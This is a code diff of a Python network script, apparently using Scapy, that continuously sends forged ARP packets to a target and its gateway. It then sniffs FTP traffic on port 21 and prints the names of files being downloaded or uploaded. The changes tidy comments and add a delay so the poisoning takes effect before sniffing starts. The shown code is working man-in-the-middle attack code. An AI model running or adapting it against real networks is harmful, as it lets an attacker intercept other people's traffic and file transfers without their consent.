@@ -1,3 +1,4 @@
+
 import argparse
 import sys
 import time
@@ -41,7 +42,6 @@ def poison_loop(ip_src, mac_src, ip_target, mac_target):
         try:
             sendp(l2_packet_for_target, verbose=False)
             sendp(l2_packet_for_gateway, verbose=False)
-            # Send packets more frequently to maintain the poisoned state
             time.sleep(1)
         except KeyboardInterrupt:
             break
@@ -52,7 +52,6 @@ def ftp_sniffer(packet):
         try:
             payload = packet[Raw].load.decode("utf-8", errors="ignore").strip()
             if payload.upper().startswith("RETR ") or payload.upper().startswith("STOR "):
-                # Force flush the output buffer to display the message immediately
                 print(f"\n[+] FTP Filename detected: {payload}\n", flush=True)
         except Exception:
             pass
@@ -74,6 +73,10 @@ def main():
     poison_thread.daemon = True
     poison_thread.start()
     
+    # Give the poison a moment to take effect before sniffing
+    print("[*] Poisoning in progress. Waiting 3 seconds...")
+    time.sleep(3)
+
     print("[*] Starting FTP sniffer on port 21...")
     try:
         sniff(filter="tcp port 21", prn=ftp_sniffer, store=False)
